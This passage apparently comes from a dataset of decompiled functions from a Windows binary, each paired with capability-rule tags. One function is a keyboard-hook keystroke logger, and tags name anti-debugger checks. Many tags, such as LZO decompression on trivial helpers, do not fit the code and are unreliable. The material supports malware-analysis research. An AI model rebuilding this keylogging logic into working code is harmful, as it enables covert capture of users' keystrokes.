fcn.00405a84();\n        fcn.004055c8();\n        puVar12 = &stack0xfffff89c;\n        fcn.00405a44(puVar12);\n        fcn.00405974();\n        if (uVar11) {\n            fcn.004055c8();\n            fcn.00405a84();\n            fcn.00405974();\n            if (uVar11) {\n                if (**0x494b1c != NULL) {\n                    uVar3 = fcn.004059dc(**0x494b30);\n                    uVar3 = fcn.00409edc(**0x4949d4, uVar3);\n                    (***0x494b1c)(uVar3);\n                    *in_FS_OFFSET = &stack0xfffff8c8;\n                    goto code_r0x0047d148;\n                }\n            }\n            else {\n                fcn.00405974();\n                if ((uVar11) && (**0x494bf4 != 0)) {\n                    uVar3 = fcn.004059dc();\n                    (***0x494974)(**0x494af0, uVar3);\n                    *in_FS_OFFSET = &stack0xfffff8c8;\n                    goto code_r0x0047d148;\n                }\n            }\n        }\n        iVar4 = fcn.0041fa34();\n        *(iVar4 + 0xf) = 1;\n        fcn.0041fc40();\n        fcn.00409edc();\n        fcn.0047f9d8();\n        fcn.0047f9dc();\n        fcn.0047f988();\n        uVar11 = 1;\n        fcn.0047f9d4();\n        fcn.0041fef0();\n    }\n    fcn.00405a44(&stack0xfffff898, puVar12);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        uVar11 = **0x494bf4 == 0;\n        if ((!uVar11) && (uVar11 = **0x494c84 == NULL,  !uVar11)) {\n            uVar3 = fcn.004059dc();\n            (***0x494c84)(uVar3);\n        }\n    }\n    fcn.00405974();\n    if (((uVar11) && (uVar11 = **0x494bf4 == 0,  !uVar11)) && (uVar11 = **0x494c54 == NULL,  !uVar11)) {\n        (***0x494c54)();\n    }\n    fcn.00405974();\n    if (((uVar11) && (uVar11 = **0x494bf4 == 0,  !uVar11)) && (uVar11 = **0x494c54 == NULL,  !uVar11)) {\n        (***0x494ca0)();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_10h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_14h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        puStack2208 = &fcn.004760a4::var_18h;\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28(&fcn.004760a4::var_1ch);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041fa34();\n        *(iVar4 + 0xf) = 1;\n        fcn.0041fc40();\n        fcn.00475aa8();\n        fcn.00475a5c();\n        fcn.00475af4();\n        fcn.00475b40();\n        fcn.00475a10();\n        fcn.00475b8c();\n        fcn.0041fef0();\n    }\n    fcn.00405a44();\n    puStack2220 = 0x47d093;\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        puStack2220 = &fcn.004760a4::var_ch;\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041fa34();\n        *(iVar4 + 0xf) = 1;\n        fcn.0041fc40();\n        fcn.00484ee8();\n        fcn.00484f08();\n        fcn.00484f74();\n        fcn.0041fef0();\n    }\n    *in_FS_OFFSET = puStack2220;\ncode_r0x0047d148:\n    *in_FS_OFFSET = puStack2208;\n    fcn.00405554(0x47d285);\n    fcn.0040700c();\n    fcn.00405554();\n    fcn.00405554();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.004060f8();\n    fcn.00405554();\n    fcn.00405554();\n    fcn.00405554();\n    fcn.00405554();\n    fcn.004060ac();\n    fcn.00411650();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 47530
    },
    "004818f8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004818f8(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar6;\n    int32_t *piStack300;\n    uint uStack296;\n    uchar *puStack292;\n    int32_t *piStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    puStack292 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack284 = 0x481d86;\n    piStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack288;\n    uStack296 = 0x481d4d;\n    piStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack300;\n    if ((arg_8h < 0) || (puVar1 = &stack0xfffffffc,  puVar2 = &stack0xfffffffc,  arg_8h == 3)) {\n        sub.user32.dll_CallNextHookEx(*0x49a1bc, arg_8h, arg_ch, arg_10h);\n        puVar1 = puStack292;\n        puVar2 = puStack280;\n    }\n    puStack280 = puVar2;\n    puStack292 = puVar1;\n    if ((arg_8h != 0) || ((arg_ch != 0x100 && (arg_ch != 0x104)))) goto code_r0x00481d2a;\n    cVar3 = fcn.004818e0();\n    if (cVar3 != '\\0') {\n        sub.user32.dll_CallNextHookEx(*0x49a1bc, 0, arg_ch, arg_10h);\n    }\n    iVar4 = *arg_10h;\n    if (iVar4 < 0x2f) {\n        if (iVar4 == 0x2e) {\n            fcn.004055c8();\n            goto code_r0x00481d10;\n        }\n        if (iVar4 - 8U < 0x26) {\n    // switch table (38 cases) at 0x4819b5\n            switch(*((iVar4 - 8U) * 4 + 0x4819b5)) {\n            case 0x481ae4:\n                fcn.004055c8();\n                break;\n            case 0x481af6:\n                fcn.004055c8();\n                break;\n            case 0x481b08:\n                fcn.004055c8();\n                break;\n            case 0x481b1a:\n                fcn.004055c8();\n                break;\n            case 0x481be0:\n                fcn.004055c8();\n                break;\n            case 0x481bf2:\n                fcn.004055c8();\n                break;\n            case 0x481c04:\n                fcn.004055c8();\n                break;\n            case 0x481c16:\n                fcn.004055c8();\n                break;\n            case 0x481c28:\n                fcn.004055c8();\n                break;\n            case 0x481c3a:\n                fcn.004055c8();\n                break;\n            default:\n                goto code_r0x00481c4c;\n            }\n            goto code_r0x00481d10;\n        }\ncode_r0x00481c4c:\n        sub.user32.dll_GetKeyState(0x14);\n        sub.user32.dll_GetKeyState(0x11);\n        sub.user32.dll_GetKeyState(0xa0);\n        sub.user32.dll_GetKeyState();\n        if (cVar3 == '\\0') {\n            sub.user32.dll_GetKeyboardState();\n            iVar4 = fcn.0040f310();\n            if (iVar4 != 0) {\n                fcn.00405c6c();\n                uVar5 = fcn.00405a3c(0);\n                sub.user32.dll_MapVirtualKeyA(*arg_10h, 0, &var_104h, uVar5);\n                iVar4 = sub.user32.dll_ToAscii();\n                if (iVar4 == 0) {\n                    fcn.00405530();\n                }\n                else if (iVar4 == 1) {\n                    fcn.00405c6c();\n                }\n                else if (iVar4 != 2) {\n                    fcn.00405530();\n                }\n            }\n        }\n    }\n    else {\n        if (0x20 < iVar4 - 0x70U) goto code_r0x00481c4c;\n    // switch table (33 cases) at 0x481a60\n        switch(*((iVar4 - 0x70U) * 4 + 0x481a60)) {\n        case 0x481b2c:\n            fcn.004055c8();\n            break;\n        case 0x481b3e:\n            fcn.004055c8();\n            break;\n        case 0x481b50:\n            fcn.004055c8();\n            break;\n        case 0x481b62:\n            fcn.004055c8();\n            break;\n        case 0x481b74:\n            fcn.004055c8();\n            break;\n        case 0x481b86:\n            fcn.004055c8();\n            break;\n        case 0x481b98:\n            fcn.004055c8();\n            break;\n        case 0x481baa:\n            fcn.004055c8();\n            break;\n        case 0x481bbc:\n            fcn.004055c8();\n            break;\n        default:\n            goto code_r0x00481c4c;\n        }\n    }\ncode_r0x00481d10:\n    fcn.00481318();\n    if (**0x494a84 == 1) {\n        fcn.00481780();\n    }\ncode_r0x00481d2a:\n    piVar6 = *0x49a1bc;\n    sub.user32.dll_CallNextHookEx(*0x49a1bc, arg_8h, arg_ch);\n    *in_FS_OFFSET = piVar6;\n    *in_FS_OFFSET = arg_10h;\n    fcn.00405530(0x481d8d);\n    return;\n}\n",
        "token_count": 1450
    },
    "00488be0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00488be0(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack204;\n    uint uStack200;\n    uchar *puStack196;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint8_t uStack8;\n    \n    puStack196 = &stack0xfffffffc;\n    uStack200 = 0x488cac;\n    uStack204 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack204;\n    fcn.00405584();\n    while( true ) {\n        uVar2 = 1;\n        uStack204 = 0;\n        iVar1 = sub.user32.dll_EnumDisplayDevicesA();\n        if (iVar1 == 0) break;\n        if ((uStack8 & 1) != 0) {\n            fcn.004057a0(*in_EAX);\n            fcn.004057a0(0x488ce8, 0);\n            uStack204 = 0x488d00;\n            fcn.004058e0();\n        }\n    }\n    *in_FS_OFFSET = uStack204;\n    fcn.00405554(0x488cb3, uVar2);\n    return;\n}\n",
        "token_count": 288
    },
    "0048cbc4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.0048cbc4(void)\n\n{\n    uint8_t uStack23;\n    uchar auStack20 [12];\n    \n    sub.kernel32.dll_GetSystemPowerStatus();\n    uStack23 = auStack20 >> 8;\n    if ((uStack23 & 1) == 1) {\n        fcn.00405584();\n    }\n    if ((uStack23 & 2) == 2) {\n        fcn.00405584();\n    }\n    if ((uStack23 & 4) == 4) {\n        fcn.00405584();\n    }\n    if ((uStack23 & 8) == 8) {\n        fcn.00405584();\n    }\n    if ((uStack23 & 0x80) == 0x80) {\n        fcn.00405584();\n    }\n    if (uStack23 == 0xff) {\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "004015d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004015d0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    param_1 = param_1 + -4;\n    iVar1 = -param_1;\n    do {\n        *(iVar1 + param_2 + param_1) = ROUND(*(iVar1 + in_EAX + param_1));\n        iVar1 = iVar1 + 8;\n    } while (iVar1 < 0);\n    *(iVar1 + param_2 + param_1) = *(iVar1 + in_EAX + param_1);\n    return;\n}\n",
        "token_count": 143
    },
    "004016f8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004016f8(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint32_t in_EAX;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    fcn.0040168c();\n    puVar3 = sub.kernel32.dll_VirtualAlloc(0, 0x13fff0, 0x1000, 4);\n    puVar1 = *0x49570c;\n    if (puVar3 != NULL) {\n        *puVar3 = 0x495708;\n        puVar2 = puVar3;\n        puVar3[1] = *0x49570c;\n        *0x49570c = puVar2;\n        *puVar1 = puVar3;\n        puVar3[0x4fffb] = 2;\n        *0x495720 = 0x13ffe0 - in_EAX;\n        *0x49571c = puVar3 + (0x13fff0 - in_EAX);\n        iVar4 = *0x49571c;\n        *(*0x49571c + -4) = in_EAX | 2;\n        return iVar4;\n    }\n    *0x495720 = 0;\n    return 0;\n}\n",
        "token_count": 280
    },
    "004022d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004022d0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = (*(in_EAX + -4) & 0xfffffff0) + in_EAX;\n    if ((*(iVar1 + -4) & 0xfffffff0) == 0) {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 91
    },
    "00402334": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402334(int32_t *param_1, int32_t **param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    *param_2 = in_EAX + 8;\n    iVar1 = *in_EAX;\n    if ((in_EAX == *(iVar1 + 0x10)) && (*(iVar1 + 8) < *(iVar1 + 0xc) || *(iVar1 + 8) == *(iVar1 + 0xc))) {\n        *param_1 = *(iVar1 + 8) + -1;\n        return;\n    }\n    *param_1 = in_EAX + ((in_EAX[-1] & 0xfffffff0U) - *(iVar1 + 2));\n    return;\n}\n",
        "token_count": 176
    },
    "00403420": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nfloat10 fcn.00403420(float10 param_1)\n\n{\n    return param_1 - ROUND(param_1);\n}\n",
        "token_count": 28
    },
    "0040580c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040580c(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "0040646c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.0040646c(void)\n\n{\n    fcn.00405d8c();\n    return 0;\n}\n",
        "token_count": 28
    },
    "0040679c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040679c(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t **in_EAX;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar3 = *in_EAX;\n    iVar5 = *arg_8h;\n    if (iVar5 < 1) {\n        if (iVar5 < 0) {\n            fcn.00403050();\n        }\n        fcn.00406794();\n    }\n    else {\n        var_10h = 0;\n        if (piVar3 != NULL) {\n            var_10h = piVar3[-1];\n            piVar3 = piVar3 + -2;\n        }\n        iVar4 = in_EDX + *(in_EDX + 1);\n        iVar1 = *(iVar4 + 2);\n        piVar2 = *(iVar4 + 6);\n        if (piVar2 == NULL) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = *piVar2;\n        }\n        if ((iVar5 * iVar1) / iVar5 != iVar1) {\n            fcn.00403050();\n        }\n        if ((piVar3 == NULL) || (*piVar3 == 1)) {\n            if ((iVar5 < var_10h) && (iVar4 != 0)) {\n                fcn.0040678c();\n            }\n            fcn.00402f34();\n        }\n        else {\n            *piVar3 = *piVar3 + -1;\n            piVar3 = fcn.00402f00();\n            var_14h = var_10h;\n            if (iVar5 < var_10h) {\n                var_14h = iVar5;\n            }\n            if (iVar4 == 0) {\n                fcn.004030fc();\n            }\n            else {\n                fcn.00403af4();\n                fcn.0040677c(var_14h);\n            }\n        }\n        *piVar3 = 1;\n        piVar3[1] = iVar5;\n        fcn.00403af4();\n        if ((1 < in_ECX) && (-1 < iVar5 + -1)) {\n            do {\n                fcn.0040679c(arg_8h + 1);\n                iVar5 = iVar5 + -1;\n            } while (iVar5 != 0);\n        }\n        *in_EAX = piVar3 + 2;\n    }\n    return;\n}\n",
        "token_count": 634
    },
    "0040738c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004073d8)\n\nvoid fcn.0040738c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint arg_8h;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x407438;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.00405530();\n    bVar3 = true;\n    arg_8h = 0x4073bd;\n    fcn.00405ed4();\n    if (!bVar3) {\n        fcn.00405ec8();\n        fcn.00405c6c();\n        arg_8h = fcn.00405ec8();\n        uVar1 = fcn.00405eb8();\n        fcn.004059dc(uVar1);\n        iVar2 = fcn.00407180(arg_8h);\n        if (iVar2 < 1) {\n            fcn.00405530();\n        }\n        else {\n            fcn.00405c6c();\n        }\n        fcn.00405584();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack28 = 0x40743f;\n    uStack32 = 0x407437;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 348
    },
    "00407448": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00407448(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar2;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4074f3;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = 0x407470;\n    fcn.00405d28();\n    if (in_EAX != 0) {\n        fcn.00405fa4();\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX + -4);\n        }\n        iVar2 = fcn.00405ec8();\n        uVar1 = fcn.004059dc(iVar2 + 1);\n        fcn.00405eb8(uVar1);\n        iVar2 = fcn.0040725c(in_EAX);\n        if (iVar2 < 1) {\n            fcn.00405d28();\n            iVar2 = in_EAX;\n        }\n        else {\n            fcn.00405fa4();\n            iVar2 = in_EAX;\n        }\n        fcn.00405d64();\n    }\n    *in_FS_OFFSET = iVar2;\n    uStack32 = 0x4074fa;\n    iStack36 = 0x4074f2;\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 359
    },
    "004097dc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004097dc(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    if ((in_EAX != 0) && (iVar1 = *(in_EAX + -4),  iVar1 != 0)) {\n        fcn.00405c6c();\n        iVar2 = *param_2;\n        uVar5 = *(iVar1 + -4 + in_EAX);\n        piVar4 = (((uVar5 | 0x80808080) + 0x84848485 | 0x80808080) + 0x9999999a & ((uVar5 | 0x80808080) ^ uVar5)) >> 2;\n        *(iVar1 + -4 + iVar2) = uVar5 - piVar4;\n        uVar5 = iVar1 - 1U & 0xfffffffc;\n        while (bVar6 = 3 < uVar5,  uVar5 = uVar5 - 4,  bVar6) {\n            uVar3 = *(uVar5 + in_EAX);\n            piVar4 = (((uVar3 | 0x80808080) + 0x84848485 | 0x80808080) + 0x9999999a & ((uVar3 | 0x80808080) ^ uVar3)) >>\n                     2;\n            *(uVar5 + iVar2) = uVar3 - piVar4;\n        }\n        return piVar4;\n    }\n    iVar1 = *param_2;\n    if ((iVar1 != 0) && (*param_2 = 0,  0 < *(iVar1 + -8))) {\n        LOCK();\n        piVar4 = iVar1 + -8;\n        *piVar4 = *piVar4 + -1;\n        if (*piVar4 == 0) {\n            fcn.00402f1c();\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 483
    },
    "00409864": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00409864(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    if ((in_EAX != 0) && (iVar1 = *(in_EAX + -4),  iVar1 != 0)) {\n        fcn.00405c6c();\n        iVar2 = *param_2;\n        uVar5 = *(iVar1 + -4 + in_EAX);\n        piVar4 = (((uVar5 | 0x80808080) + 0xa4a4a4a5 | 0x80808080) + 0x9999999a & ((uVar5 | 0x80808080) ^ uVar5)) >> 2;\n        *(iVar1 + -4 + iVar2) = uVar5 + piVar4;\n        uVar5 = iVar1 - 1U & 0xfffffffc;\n        while (bVar6 = 3 < uVar5,  uVar5 = uVar5 - 4,  bVar6) {\n            uVar3 = *(uVar5 + in_EAX);\n            piVar4 = (((uVar3 | 0x80808080) + 0xa4a4a4a5 | 0x80808080) + 0x9999999a & ((uVar3 | 0x80808080) ^ uVar3)) >>\n                     2;\n            *(uVar5 + iVar2) = uVar3 + piVar4;\n        }\n        return piVar4;\n    }\n    iVar1 = *param_2;\n    if ((iVar1 != 0) && (*param_2 = 0,  0 < *(iVar1 + -8))) {\n        LOCK();\n        piVar4 = iVar1 + -8;\n        *piVar4 = *piVar4 + -1;\n        if (*piVar4 == 0) {\n            fcn.00402f1c();\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 491
    },
    "00409aa8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409aa8(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    fcn.004059dc();\n    fcn.00405620();\n    if (0 < in_EAX) {\n        sub.user32.dll_CharUpperBuffA(*param_2, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00409ae0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409ae0(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    fcn.004059dc();\n    fcn.00405620();\n    if (0 < in_EAX) {\n        sub.user32.dll_CharLowerBuffA(*param_2, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00409b18": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00409b18(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    uVar1 = fcn.004059dc(param_2);\n    uVar1 = fcn.004059dc(in_EAX, uVar1);\n    iVar2 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar1);\n    return iVar2 + -2;\n}\n",
        "token_count": 169
    },
    "00409b7c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409b7c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    for (iVar1 = 1; (iVar1 <= iVar2 && (*(in_EAX + -1 + iVar1) < 0x21)); iVar1 = iVar1 + 1) {\n    }\n    if (iVar2 < iVar1) {\n        fcn.00405530();\n    }\n    else {\n        for (; *(in_EAX + -1 + iVar2) < 0x21; iVar2 = iVar2 + -1) {\n        }\n        fcn.00405a44(param_2);\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "00409c20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409c20(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    for (; (0 < iVar1 && (*(in_EAX + -1 + iVar1) < 0x21)); iVar1 = iVar1 + -1) {\n    }\n    fcn.00405a44(param_2);\n    return;\n}\n",
        "token_count": 125
    },
    "00409c58": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00409c58(uint param_1, char param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    \n    uVar4 = 0;\n    pcVar5 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar5 = *(in_EAX + -4);\n    }\n    if (pcVar5 == NULL) {\n        bVar2 = true;\n    }\n    else {\n        cVar1 = *in_EAX;\n        if (((cVar1 + 0xbfU < 0x1a) || (cVar1 == '_')) || (cVar1 + 0x9fU < 0x1a)) {\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = 0;\n        }\n        bVar2 = uVar3 ^ 1;\n    }\n    if (!bVar2) {\n        if (param_2 == '\\0') {\n            pcVar5 = in_EAX;\n            if (in_EAX != NULL) {\n                pcVar5 = *(in_EAX + -4);\n            }\n            if (1 < pcVar5) {\n                pcVar5 = pcVar5 + -1;\n                iVar6 = 2;\n                do {\n                    cVar1 = in_EAX[iVar6 + -1];\n                    if (((9 < cVar1 - 0x30U) && (0x19 < cVar1 + 0xbfU)) && ((cVar1 != '_' && (0x19 < cVar1 + 0x9fU)))) {\n                        return 0;\n                    }\n                    iVar6 = iVar6 + 1;\n                    pcVar5 = pcVar5 + -1;\n                } while (pcVar5 != NULL);\n            }\n        }\n        else {\n            pcVar5 = in_EAX;\n            if (in_EAX != NULL) {\n                pcVar5 = *(in_EAX + -4);\n            }\n            if (1 < pcVar5) {\n                pcVar5 = pcVar5 + -1;\n                iVar6 = 2;\n                do {\n                    cVar1 = in_EAX[iVar6 + -1];\n                    if (((cVar1 != '.') && (9 < cVar1 - 0x30U)) &&\n                       ((0x19 < cVar1 + 0xbfU && ((cVar1 != '_' && (0x19 < cVar1 + 0x9fU)))))) {\n                        return 0;\n                    }\n                    iVar6 = iVar6 + 1;\n                    pcVar5 = pcVar5 + -1;\n                } while (pcVar5 != NULL);\n            }\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 630
    },
    "00409dc4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409dc4(int16_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *in_EAX;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    char cStack8;\n    \n    if ((*(in_EAX + 4) & 0x80000000) == 0) {\n        fVar7 = *in_EAX;\n    }\n    else {\n        fVar7 = 0x7fffffffffffffff + 1 + (*in_EAX & 0x7fffffffffffffff);\n    }\n    fVar5 = param_1;\n    puVar4 = unaff_ESI;\n    do {\n        puVar4 = puVar4 + -1;\n        fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;\n        fVar7 = fVar7 / fVar5;\n        cStack8 = ROUND(fVar6);\n        uVar2 = cStack8 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = cStack8 + 0x37;\n        }\n        *puVar4 = uVar2;\n    } while (1 <= fVar7);\n    iVar3 = param_2 - (unaff_ESI - puVar4);\n    if (unaff_ESI - puVar4 <= param_2 && iVar3 != 0) {\n        iVar1 = -iVar3;\n        while (iVar3 = iVar3 + -1,  iVar3 != 0) {\n            (puVar4 + iVar1)[iVar3] = 0x30;\n        }\n        puVar4[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 422
    },
    "0040a000": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
